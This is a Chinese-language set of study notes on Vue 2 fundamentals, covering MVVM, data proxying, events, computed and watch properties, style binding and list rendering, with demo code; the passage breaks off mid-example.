---
title: 'Vue核心'
date: '2023-04-13 02:05:21'
tags: ['Vue']
language: 'zh-cn'
description: '核心知识'
---

[TOC]



### 一.什么是Vue

##### 1. **概念**：

##### 				Vue 是一套用来动态构建用户界面的 *渐进式* JavaScript框架

##### 2. **构建用户界面**：

##### 				把数据通过某种办法变成用户界面

##### 3. **渐进式**：

##### 				Vue可以自底向上逐层的应用，简单应用只需要一个轻量小巧的核心库，杂应用可以引入各式各样的Vue插件

```
● vue-cli：vue 脚手架
● vue-resource(axios)：ajax 请求
● vue-router：路由
● vuex：状态管理（它是 vue 的插件但是没有用 vue-xxx 的命名规则）
● vue-lazyload：图片懒加载
● vue-scroller：页面滑动相关
● mint-ui：基于 vue 的 UI 组件库（移动端）
● element-ui：基于 vue 的 UI 组件库（PC 端）
```

##### 4. **初识Vue**

- 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象

- root 容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法

- root 容器里的代码被称为**Vue模板**

- Vue 实例与容器是<u>一 一对应的</u>

- 真实开发中只有一个Vue实例，并且会配合着组件一起使用

- {{xxx}}中的 xxx 要写 js 表达式，且 xxx 可以自动读取到data中的所有属性

- 注意区分：js 表达式 和 js代码（语句）

    1）表达式：表达式会产生一个值

    ​			a	a+b		demo(1)		x === y ? 'a' : 'b'

     2）js代码（语句）

    ​			if(){}		for(){}

- 一旦data中的数据发生变化，那么模板中用到该数据的地方也会自动更新

###  二.MVVM模型 

#### 1. M-V-VM模型概念：

-   基于前端开发的架构模式，其核心是提供对View 和 ViewModel 的双向数据绑定，这使得ViewModel 的状态改变可以自动传递给 View，即所谓的数据双向绑定。

​	**● M：模型 Model，data中的数据**               （用来存储数据的）
​	   	**● V：视图 View，模板代码**						 （展示UI界面和响应用户交互）
​	       **● VM：视图模型 ViewModel，Vue实例**     （用一个专门的对象vm去管理数据和逻辑处理部分）

![image-20230330203147542](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202303302031623.png)

![image-20230330182335467](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202303301823556.png)

#### 2. 代码演示M-V-VM模型：

```vue
<!-- 容器（Vue模板代码） -->
<div id="root">
	<!-- 打印vm中data中的name和address属性 -->
    <h1>学校名称：{{name}}</h1>       							v
    <h1>学校地址：{{address}}</h1>
    
	<!-- 打印1+1 -->
	<h1>测试1：{{1+1}}</h1>									
	<!-- 打印Vue实例对象vm中的$options方法 -->
     <h1>测试2：{{$options}}}</h1>									
	<!-- 打印Vue实例对象vm中的$emit方法    -->
     <h1>测试3：{{$emit}}</h1>		
	<!--打印Vue中对象原型__proto__ 中的 _c 属性 -->
     <h1>测试4：{{_c}}</h1> 			 
</div>

<!-- Vue实例 -->												VM
<script>
    const vm = new Vue ({
        el: '#root',
        data: {												  M
            name: 'yanle',							
            address: '西安市'
        }
    })
    console.log(vm);
```

![image-20230330182325218](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202303301823320.png)

1.  创建一个vm视图模型，对象data的数据放入再vm中
2.  创建Vue的模板代码
3.  Vue模板代码可以调用vm的所有属性及vm原型对象的所有属性

### 三.数据代理

- **通过一个对象代理对另一个对象中属性的操作 (读和写操作)**

#### 	1.回顾Object.defineProperty方法

```js
Object.defineProperty(对象,'要修改的属性(可以新建属性)',{
    // value:男             			// 设置属性的值
    // enumerable:true     			 // 控制属性是否可以被枚举，默认false
    // writable: true      			 // 控制属性是否可以被修改，默认false
    // configurable：true   			// 控制属性是否可以被删除，默认false
    
    // get函数	无参数，返回值为属性的值		
    // 读取到对象的修改的属性时,get函数(getter)就会被调用
    
    // set函数    参数为属性的值，返回值为修改后的值 
    // 当有人修改对象的value属性时，set函数(setter)就会被调用，且会收到修改的具体值
})
```



```js
let sex = '男';
let person = {
    name: 'yanle',
    age: 22
}
Object.defineProperty(person,'sex',{
    // get函数 函数返回值是sex的值
    // 读取到person的sex属性时,get函数(getter)就会被调用
    get() {
        console.log('有人读取了get里面的值');
        return sex;
    },
    // set(value) value为被赋予的新值
    // 当有人修改person的age 属性时，set函数(setter)就会被调用，且会收到修改的具体值
    set(value) {
        console.log('有人修改了sex 且值是',value);
        sex = value;
    }
})
// person.sex;                  // 调用person.sex，会调用get函数         
// person.sex = '未知';         // 修改sex属性值，会调用set函数
console.log(person);
```



#### 	2.什么是数据代理

-   通过一个对象可以对另一个对象中的属性进行读和写操作

 ```js
let obj = { x: 100 }
let obj2 = { y: 200 }

// 通过obj2来修改obj中的x值
Object.defineProperty(obj2, 'x', {
    // 读取obj2中的x，get返回obj.x
    get() {
        return obj.x;
    },
    // 修改obj2中的x，set将value赋值给obj.x
    set(value) {
        obj.x = value;
    }
})
 ```

​    ![image-20230330215300661](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202303302153984.png)修改obj2.x为300，obj.x值变为300,实现了数据代理

#### 	3.Vue中的数据代理

1. 通过Vue实例化对象—vm来对data对象中的属性进行读和写操作（数据代理）

2. Vue数据代理的好处，可以直接vm.name调用（读和写）data.name的值，更加方便操作data数据

3. 基本原理：

    -   vm中通过Object.defineProperty来实现对data对象的读和写
    -   vm中_data对象的每个属性都有一个相对应的==get()函数==和==set()函数==,get和set内部再去对data中的数据实现读和写

    <img src="https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202303302224218.png" alt="image-20230330222437080" style="zoom: 50%;" />

<img src="https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202303302211765.png" alt="image-20230330221145505" style="zoom: 67%;" />



Vue将vm中的data对象拷贝一份到vm中，命名为\_data，又将\_data中的属性值放到View视图，通过Object.defineProperty，实现数据代理，给\_data中的每个属性添加 ==getter== / ==setter== 函数，这样vm通过get()函数和set()函数来操作name/address，进而操作_data对象中的属性值。而\_data又对data进行数据劫持，实现了响应式

> vm给_data种的每个属性设置getter和setter函数，同过vm.name修改值，就是修改\_data中的属性值（实现了数据代理），然而\_data又对data进行了数据劫持，实现了响应式。





### 四. 事件处理

> 点击一个按钮，执行vm里对应的函数

- 事件处理的作用：`使用v-on（简写为@）来监听DOM指令，并且在事件触发时会执行相应javascript`
- 在methods对象中创建的事件回调函数，也会出现在vm中
- 事件回调函数不需要做数据代理，因此不用存储在data中

#### 	1. 事件的基本用法：

1. ==v-on:xxx== 和 ==@xxx== 进行事件绑定	
2. 箭头函数的本身无this指向，随它上一级的this指向，在methods中不能使用箭头函数，否则this指向就不是vm
3. methods中的函数，都是被Vue管理的函数，this指向的是 vm 或者 组件实例对象。
4. ==@click=“demo”== 与 ==@click=“demo($event)”== 效果一样，后者可以传参数





> event.target: e.target可以准确地获取事件源
>
> event.target.innerText : 获取事件源的文本值


```html
<div id="root">
    <button v-on:click="showInfo">点击我提示信息</button>
    <button @click="showInfo1">点击我提示信息1（不传参数）</button>
    <button @click="showInfo2">点击我提示信息2（传参数）</button>
</div>

<script>
    const vm = new Vue({
        el: '#root',
        data: {
            name: 'cess'
        },
        methods: {
            showInfo(event) {
                console.log(event.target.innerText);
                console.log(this); //this指向是vm
                alert('同学你好');
            },
            showInfo1: function (event) {
                console.log(event.target.innerText),
                    console.log(this);	//this指向是vm
                alert('同学你好');

            },
            showInfo2: function  (event,number) {
                console.log(event, number);
                console.log(event.target.innerText);
                console.log(this); 		//this指向是vm
                alert('同学你好');
            }
        }
    })    

</script>
```


​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       

#### 2. 事件修饰符

##### Vue中的事件修饰符：

1. `prevent`	 阻止默认事件（常用）
2. `stop`		阻止事件冒泡（常用）
3. `once`		事件只触发一次（常用）
4. capture	 使用事件的捕获模式
5. self		只有event.target是当前操作的元素时才触发事件
6. passive	 事件的默认行为立即执行，无需等待事件回调执行完毕

```html
<div id="root">
    <h2>你好，{{name}}</h2>
	<!-- 阻止默认事件（常用） -->
	<a href="https:www.baidu.com" @click.prevent="showInfo" target="_blank">点击我提示信息</a>

	<!--  阻止事件冒泡（常用） -->
	<div id="demo1" @click="showInfo">
    <button @click.stop="showInfo">点击我提示信息</button>
</div>

	<!-- 事件只触发一次 -->
	<button @click.once="showInfo">点击我提示信息</button>
</div>
<script>
    new Vue({
    el: '#root',
    data: {
        name: 'yanle'
    },
    methods: { 
        showInfo(event){
            // event.stopPropagation(); //以前阻止冒泡的方法
            alert('同学你好！')
        }
    }
})
</script>
```

#### 3. 键盘修饰符

- **键盘上的每个按键都有自己的名称和编码，例如：Enter（13）。而Vue还对一些常用按键起了别名方便使用**

> 1. Vue中常用的按键别名
>     回车 enter
>
>      删除 delete 捕获“删除”和“退格”键
>
>      退出 esc
>
>      空格 space
>
>      换行tab特殊，必须配合keydown去使用
>
>      上 up
>
>      下 down
>
>      左 left
>
>      右 right
>
>
>     2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为`kebab-case`（多单词小写短横线写法）
>                                                                                 
>     3. 系统修饰键（用法特殊）ctrl alt shift meta（meta就是win键）
>
>    a. 配合==keyup==使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发指定 
>
>       ctr+y 使用  @keyup.ctr.y
>
>   b. 配合==keydown==使用：正常触发事件
>
> 4. 也可以使用keyCode去指定具体的按键（不推荐）
>
> 5. `Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名`

```html
<div id="root">
    <h2>欢迎打开{{name}}的笔记本</h2>
    <input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo" value="1"><br>
    <input type="text" placeholder="按下tab提示输入" @keydown.tab="showInfo"><br>
    <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo"><br>
</div>

<script>
    Vue.config.keyCodes.huiche = 13 //定义别名按键          回车：13
    new Vue ({
        el: '#root',
        data: {
            name: 'yanle'
        },
        methods: {
            showInfo(event) {
                console.log(event.target.value);
            }
        }
    })
</script>
```

### 五. 计算属性和侦听属性

#### 1. 计算属性

##### （1） 差值语法实现

![image-20230403153042626](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304031530803.png)

```html
<!-- 1. 差值语法实现 -->
<div id="root">
    <input type="text" v-model="first_name"> <br>
    <input type="text" v-model="second_name"> <br>
    全名： <span>{{first_name}} - {{second_name}}</span>
</div>

<script>
    new Vue ({
        el: '#root',
        data: {
            first_name: '张',
            second_name: '三'
        }
    })
</script>
```

##### （2）methods实现

> **使用 methods ，在重新渲染的时候，函数总会重新调用执行**

```html
<!-- 2. method 实现 -->
<!-- 数据发生变化,模板就会被重新解析 -->
<!-- Vue对象中的data发生变化，模板中的方法也会被重新调用 -->
<div id="root">
    姓:<input type="text" v-model="first_name"> <br>
    名:<input type="text" v-model="second_name"> <br>
    全名： <span>{{fullname()}}</span>
</div>
<script>
    let vm = new Vue({
        el: '#root',
        data: {
            first_name: '严',
            second_name: '乐'
        },
        methods: {
            fullname() {
                return this.first_name + ' - ' +this.second_name;
            }
        }
    })
</script>
```

**①**原来模板显示：                                         <img src="https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304031543309.png" alt="image-20230403154305235" style="zoom: 50%;" /> 

②修改vm.first_name值：                          <img src="https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304031543799.png" alt="image-20230403154352749" style="zoom: 50%;" />

③数据发生变化，模板代码重新解析，显示修改后的性         <img src="https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304031545776.png" alt="image-20230403154518731" style="zoom:50%;" />

##### （3）computed 计算属性

> `1.什么是computed`  
>
> ​				 **计算属性是基于缓存实现的**，只在计算属性所依赖的数据发生改变时它们才会重新求值
>
> `2.什么时候用computed` 
>
> ​	 			**对于任何<u>复杂逻辑</u>其计算结果需要被缓存的你都应当使用计算属性**
>
> `3.原理`
>
> ​				 底层借助了Objcet.defineproperty()方法提供的==getter==和==setter==
>
> ​				 ==调用getter==： 
>
> ​							* get(){} 必须要写,无参数
>
> ​							* 初次读取时调用一次
>
> ​							* 计算属性所依赖的数据发生变化时，调用getter	 
>
> ​			 	==调用setter==
>
> ​							*  set(){} 可选
>
> ​							*  当计算属性被修改的时候，调用setter
>
> ​		         ==get和set中的this指向==
>
> ​							* this指向vm
>
> `4.与methods相比的优势`
>
> ​					computed内部具有缓存机制，计算效率更高，调试方便

> **计算属性过程**
>
> 			1. 第一次调用get,vm上出现和计算属性同名的缓存属性，该属性值调用get返回的值
> 			2. 再次调用get值时，Vue把get返回值赋值给这个缓存
> 			3. `缓存属性`： 当不是初次访问计算属性，并且计算属性依赖的值没有发生变化，Vue调用的是缓存属性里的值，而不是get的 返回值。

```html
<body>
    <div id='root'>
        	<input type="text" v-model="firstName"><br>
        	<input type="text" v-model="LastName"><br>
        	<span>{{firstName}}  ' - '  {{lastName}}</span>
    </div>
</body>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {
            firstName: '熊',
            lastName: '大'
        },
        computed:{
            fullName:{
                get(){
                    return this.firstName+ this.lastName
                },
                set(value){
                }
            }
            // 简写----如果计算属性确定不考虑修改，可以使用计算属性的简写形式
            //fullName() {
        	//console.log('get被调用了')
   			//	 return this.firstName + '-' + this.lastName
   			//}
        }
    })
</script>
```

#### 2.侦听属性

> `watch监视属性`
>
> 1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
>
>  2. 监视的属性必须存在，才能进行监视，既可以监视data，也可以监视计算属性
>  3. 配置项属性默认==immediate==:false，改为 true，则初始化时调用一次 handler(newValue,oldValue)
> 	2. 监视有两种写法：
> 	 创建Vue时传入==watch: {}==配置
> 	    通过==vm.$watch()==监视
>  5. ==handler==: 其值是一个回调函数。即监听到变化时应该执行的函数

```html
<div id="root">
    <h3>今天天气很{{info}}</h3>
    <button @click="ChangeWether">切换天气</button>
</div>
<script>
    let vm = new Vue({
        el: '#root',
        data: {
            isHot: true  
        },
        // 计算属性: 用来判断天气
        computed: {
            info () {
                return this.isHot ? '炎热' : '冷';  
            }
        },
        // 改变天气的函数
        methods: {
            ChangeWether () {
                this.isHot = !this.isHot;
            }
        },
        // 方式一：
        watch: {
            isHot: {
                immediate: false,
                // 修改vm.isHot为true,会打印以下:
                handler(newValue,oldValue) {
                    console.log('isHot的值被修改了',newValue,oldValue);
                }
            }
        }
    })
    
    // 方式二：
    // 通过vm.watch('键',{函数})        // 键:就是监控的值
    // vm.$watch('ishot',{
    // 		immediate：其值是true或false；
    // 		确认初始化时是否执行handler的函数。(默认为false)
    //    immediate: true,
    //    handler(newValue,oldValue) {
    //        console.log('isHot被修改了',newValue,oldValue);
    //   }
    //})
</script>
```

![image-20230403202919147](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304032029366.png)

​		修改vm.isHot 值 为false后，侦听属性侦听到值的修改，打印 newValue为false，oldValue为true

![image-20230403202929157](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304032029200.png)

#### 3. 深度监听

>    **监视多级结构中某个属性的变化**

> 1. Vue中的watch默认不监测对象内部值的改变（一层）
>
> 2. 在watch中配置`deep:true`可以监测对象内部值的改变（多层）
>
>     **注意**
>
> ​    1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
>
> ​    2. 使用watch时根据监视数据的具体结构，决定是否采用深度监视

```js
<div id="root">
    <h3>a的值是:{{ numbers.a }}</h3>
<button @click="numbers.a++">点我让a+1</button>
<h3>b的值是:{{ numbers.b }}</h3>
<button @click="numbers.b++">点我让b+1</button>
<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
{{numbers.c.e}}
</div>

<script>
    var vm = new Vue({
        el: '#root',
        data: {
            numbers: {
                a: 1,
                b: 2,
                c: {
                    e:100
                }
            }
        },
        watch: {
            // 监视多级结构中某个属性的变化
            /* 'numbers.a':{
                          handler(){
                              console.log('a被改变了')
                          }
                      } */
            // 监视多级结构中所有属性的变化
            deep: true,
            numbers: {

                handler() {
                    console.log('numbers改变了')
                }
            }
        }
    })
</script>
```

#### 4. 侦听属性简写

> 如果监视属性除了handler没有其他配置项的话，可以进行简写

```html
<div id="root">
    <h3>今天天气很{{info}}</h3>
    <button @click="ChangeWether">切换天气</button>
</div>
<script>
    let vm = new Vue({
        el: '#root',
        data: {
            isHot: true
        },
        // 计算属性: 用来判断天气
        computed: {
            info() {
                return this.isHot ? '炎热' : '冷';
            }
        },
        // 改变天气的函数
        methods: {
            ChangeWether() {
                this.isHot = !this.isHot;
            }
        },
        // 方式一
        //     watch: {
        //         isHot: {
        //             immediate: false,
        //             // 修改vm.isHot为true,会打印以下:
        //             handler(newValue, oldValue) {
        //                 console.log('isHot的值被修改了', newValue, oldValue);
        //             }
        //         }
        //     }
        //  方式一简写: 当配置项只有handler一个的时候可以简写
        //     watch: {
        //         isHot(newValue,oldValue) {
        //             console.log('isHot的值修改了',newValue,oldValue,this);
        //         }
        //     }

    })

    // 方式二:
    // 通过vm.watch('键',{函数})        // 键:就是监控的值
    // vm.$watch('isHot',{
    //     // immediate：其值是true或false；确认是否以当前的初始值执行handler的函数。(默认为false)
    //     immediate: false,
    // 修改vm.isHot为true,会打印以下:
    //     handler(newValue,oldValue) {
    //         console.log('isHot被修改了',newValue,oldValue);
    //     }
    // })
    // 方式二简写:
    vm.$watch('isHot',(newValue,oldValue) => {
        console.log('isHot值被修改了',newValue,oldValue,this);
    })
</script>
```

#### 5. 计算属性 VS 侦听属性：

> `computed和watch之间的区别`
> 		●computed能完成的功能，watch都可以完成
> 		●watch能完成的功能，computed不一定能完成，例如watch可以进行异步操作

> `两个重要的小原则`
> 		●所有<u>**被Vue管理的函数**</u>，最好写成==普通函数==，这样 this 的指向才是vm或组件实例对象
> 		●所有**<u>不被Vue所管理的函数</u>**（定时器的回调函数、ajax 的回调函数等、Promise 的回调函数），
>
> ​      最好写成==箭头函数==，这样 this 的指向才是vm或组件实例对象

### 六. 绑定样式和条件渲染

#### 1. 绑定样式

==:class样式==  动态获取样式 
		●写法：`:class="xxx"`，xxx 可以是字符串、数组、对象
		●`:style="[a,b]"`其中a、b是样式对象
		●`:style="{fontSize: xxx}"`其中 xxx 是动态值
		○ 字符串写法适用于：类名不确定，要动态获取 
		○ 数组写法适用于：要绑定多个样式，个数不确定，名字也不确定 
		○ 对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用 

```html
<div id="root">
    <!-- 1. 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic " :class="mood" @click="changeMood">{{name}}</div><br /><br />

    <!-- 2. 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div><br /><br />

    <!-- 3. 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div><br /><br />

    <!-- 4. 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div><br /><br />

    <!-- 5. 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
</div>
<script>
    const vm = new Vue({
        el: '#root',
        data: {
            name: 'yanle',
            mood: 'normal', //1
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],     //2
            classObj: {                 //3
                atguigu1: true,
                atguigu2: true,
                atguigu3: false
            },
            styleObj: {                 //4
                fontSize: '12px',
                color: 'red'
            },
            styleArr: [                 //5 
                {
                    fontSize: '40px',
                    color: 'blue',
                },
                {
                    backgroundColor: 'gray'
                }
            ]
        },
        methods: {
            changeMood() {
                const arr = ['happy', 'sad', 'normal']
                const index = Math.floor(Math.random() * 3)
                this.mood = arr[index]
            }
        }
    })
</script>
```



#### 2. 条件渲染

==v-if==
	● 写法 跟 if else 语法类似
		v-if="表达式"
		v-else-if="表达式"
		v-else
	● 适用于：切换频率较低的场景，因为不展示的DOM元素直接被移除
	● 注意：v-if可以和v-else-ifv-else一起使用，但要求结构不能被打断

==v-show==
	●写法：v-show="表达式"
	●适用于：切换频率较高的场景
	●特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉display: none

==v-if和v-show==

​	**备注：**使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到

==template==

​	标签不影响结构，页面html中不会有此标签，但**只能配合v-if**，不能配合v-show

```html
<title>条件渲染</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
  <h2>当前的n值是:{{ n }}</h2>
  <button @click="n++">点我n+1</button>

  <!-- 使用v-show做条件渲染 -->
  <!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
  <!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

  <!-- 使用v-if做条件渲染 -->
  <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
  <!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

  <!-- v-else和v-else-if -->
  <!-- <div v-show="n === 1">Angular</div> -->
  <!-- <div v-show="n === 2">React</div> -->
  <!-- <div v-show="n === 3">Vue</div> -->

  <!-- <div v-if="n === 1">Angular</div> -->
  <!-- <div v-else-if="n === 2">React</div> -->
  <!-- <div v-else-if="n === 3">Vue</div> -->
  <!-- <div v-else>哈哈</div> -->


  <!-- v-if与template的配合使用 -->
  <template v-if="n === 1">
    <h3>你好</h3>
    <h3>尚硅谷</h3>
    <h3>北京</h3>
  </template>

</div>

<script type="text/javascript">
  Vue.config.productionTip = false
  const vm = new Vue({
    el:'#root',
    data:{
      name:'尚硅谷',
      n:0
    }
  })
</script>
```

### 七. 列表渲染和数据监视

#### 1.基本列表

**v-for指令**:

> - v-for作用： 列表渲染，所在标签结构，按照数据数量，循环生成。
>
> - v-for中 :key的作用： 
>
>     - 有key，key设置为index，按照index进行比较；
>     - 无key，就地更新  
>
> - 语法
>
>     ​	`v-for=“(值变量，索引值) in 目标结构” :key=“索引值”`
>
>     ​	`v-for=“值变量” in 目标结构“ :key=”索引值“`

```html
<div id="root">
    <!-- v-for 遍历数组 -->
    <h2>v-for遍历数组</h2>
    <ul>
        <li v-for="p in persons" :key="p.id">{{p.name}} - {{p.age}}</li>
    </ul>

    <!-- 遍历对象 -->
    <h3>汽车信息</h3>
    <ul>
        <li v-for="(item,index) in cars" :key="index">{{index}} - {{item}} </li>
    </ul>

    <!-- 遍历字符串（用的少） -->
    <h3>遍历字符串（用的少）</h3>
    <ul>
        <li v-for="(item,index) in str">{{index+1}} - {{item}}</li>
    </ul>

    <!-- 测试遍历指定次数（用的少） -->
    <h3>遍历指定次数（用的少）</h3>
    <ul>
        <li v-for="(item,index) of 10" :key="index" >{{'索引值：'+index}}  -  {{'次数：'+item}}</li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            persons: [
                { id: 001, name: 'yanle', age: 19 },
                { id: 002, name: 'sb', age: 20 },
                { id: 003, name: 'nle', age: 21 }
            ],
            cars: {
                name: '奥迪A8',
                price: '70万',
                color: '黑色'
            },
            str: 'hello'
        }
    })
</script>
```

#### 2. key的作用与原理：

![image.png](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304072236251.png)

![image.png](https://pic-go-yjw.oss-cn-hangzhou.aliyuncs.com/topora_byYL/202304072237862.png)

##### 面试题： Vue中 `:key`有什么作用？（`:key`的原理是什么）

> **1. key是虚拟Dom的中对象的标识，当数据发生变化的时候，Vue会根据`新数据`生成`新虚拟dom`，随后Vue进行新虚拟dom和旧虚拟dom的差异比较，比较规则如下：**
>
> ==比较规则==
>
> ​	**(1)旧的虚拟dom找到了与新虚拟dom相同的key：**
>
> ​		Ⅰ. 新虚拟dom的内容没有变，则复用旧虚拟dom中的数据；
>
> ​		Ⅱ. 新虚拟dom的内容变化，则生成新的`真实dom`，随后替换掉原来旧的真实dom；
>
>    ​	**（2）旧的虚拟dom没 有找到与新虚拟dom相同的key**
>
> ​		Ⅰ. 创建新的真实dom，随后渲染到页面上

> **2. `index`作为`key`可能会引发的问题:**
>
> ​	Ⅰ. 如果对数据进行逆向添加，逆序删除等`破坏顺序的操作`,会产生没有必要的真实dom（虽然页面效果正常，但效率低）
>
> ​	Ⅱ. 如果结构中包含`输入类的dom`（input等）：会产生Dom更新错误 ==> 界面有问题 

> **3. 开发中如何选用key**
>
> ​	Ⅰ. 最好使用`每条数据的唯一标识作为key`，比如 id、手机号、身份证号、学号等唯一值;
>
> ​	Ⅱ. 如果<u>不存在</u>对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的

#### 3. 列表过滤

> 用watch实现

```html
<div id="root">
    <h2>列表过滤</h2>
    <input type="text" placeholder="请输入用户名" v-model="keyWords">
    <ul>
        <!-- 1. 通过v-modle 页面输入的数据  -->
        <li v-for="(p,index) in filpersons" :key="index">{{p.id}} - {{p.name}} - {{p.age}}</li>
    </ul>

</div>
<script>
    new Vue({
        // #region
        el: '#root',
        data: {
            keyWords: '',
            persons: [
                { id: '001', name: '马冬梅', age: 19 },
                { id: '002', name: '周冬雨', age: 20 },
                { id: '003', name: '周杰伦', age: 21 },
                { id: '003', name: '温兆伦', age: 21 }
            ],
            filpersons: []
        },
        watch: {
            keyWords: {
                immediate: true,
                handler(value) {
                    // filter 返回的是一个浅拷贝数组的某个对象
                    this.filpersons = this.persons.filter(v => {
                        // 将满足条件的所有对象都过滤出来，形成一个新的数组
                        return v.name.indexOf(value) !== -1;
                    })
                }
            }
        }
    })
    // #endregion
```

> 用computed计算属性实现

```html
<div id="root">
    <h2>列表过滤</h2>
    <input type="text" placeholder="请输入用户名" v-model="keyWords">
    <ul>
        <!-- 1. 通过v-modle 页面输入的数据  -->
        <li v-for="(p,index) in filpersons" :key="index">{{p.id}} - {{p.name}} - {{p.age}}</li>
    </ul>

</div>
<script>
    //用computed实现
    new Vue({
        el: '#root',
        data: {
            keyWords: '',
            persons: [
                { id: '001', name: '马冬梅', age: 19 },
                { id: '002', name: '周冬雨', age: 20 },
                { id: '003', name: '周杰伦', age: 21 },
                { id: '003', name: '温兆伦', age: 21 }
            ],
        },
        computed: {
            filpersons() {
                return this.persons.filter(p => {
                    return p.name.indexOf(this.keyWords) !== -1;
                })
                // 1. filter返回的是一个新数组
                // this.persons.filter(p => {
                //     return p.name.indexOf(this.keyWords) !== -1;
                // })
                // 2. conputed接受的是return的值，所以还需要将新数组进行return
            }
        }
    })
</script>
```

#### 4. 数据列表

```html
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <button @click="sortType = 2">年龄升序</button>
    <button @click="sortType = 1">年龄降序</button>
    <button @click="sortType = 0">原顺序</button>
    <ul>
        <li v-for="(p,index) of filPersons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            sortType: 0, // 0原顺序 1降序 2升序
            persons: [
                { id: '001', name: '马冬梅', age: 30, sex: '女' },
                { id: '002', name: '周冬雨', age: 31, sex: '女' },
                { id: '003', name: '周杰伦', age: 18, sex: '男' },
                { id: '004', name: '温兆伦', age: 19, sex: '男' }
            ]
        },
        computed: {
            filPersons() {
                const arr = this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1
                })
                //判断一下是否需要排序
                if (this.sortType) {
                    arr.sort((p1, p2) => {
                        return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age
                    })
                }
                return arr
            }
        }
    })
</script>
```

#### 5. 总结Vue的监视数据

##### 1. Vue是如何检测`对象`属性的改变的

> 通过setter实现监视，且要在new Vue()时就传入要监测的数据 
>
> 1.对象创建后追加的属性，Vue默认不做响应式处理
>
> 2.如需给后添加的属性做响应式，请使用如下API
> 		==Vue.set(target,propertyName/index,value)==
> 		==vm.$set(target,propertyName/index,value)==

##### 2. Vue是如何检测数组属性的改变的

>   通过包裹数组更新元素的方法实现，本质就是做了两件事
> 		1. 调用原生对应的方法对数组进行更新
> 	    2. 重新解析模板，进而更新页面
>
>   **在Vue修改数组中的某个元素一定要用如下方法** 
> 	 push(); pop(); unshift(); shift(); splice(); sort(); reverse(); 这几个方法被Vue`重写`了
> 		Vue.set()或vm.$set()
> 		特别注意：`Vue.set()` 和 `vm.$set()` **不能**给vm或vm的根数据对象（data等）添加属性





```html
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1岁</button> <br />
        <button @click="addSex">添加性别属性，默认值：男</button> <br />
        <button @click="student.sex = '未知' ">修改性别</button> <br />
        <button @click="addFriend">在列表首位添加一个朋友</button> <br />
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
        <button @click="addHobby">添加一个爱好</button> <br />
        <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
        
        <h3>姓名：{{ student.name }}</h3>
        <h3>年龄：{{ student.age }}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">{{ h }} </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">{{ f.name }}--{{ f.age }}</li>
        </ul>
    </div>

    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                student: {
                    name: 'tom',
                    age: 18,
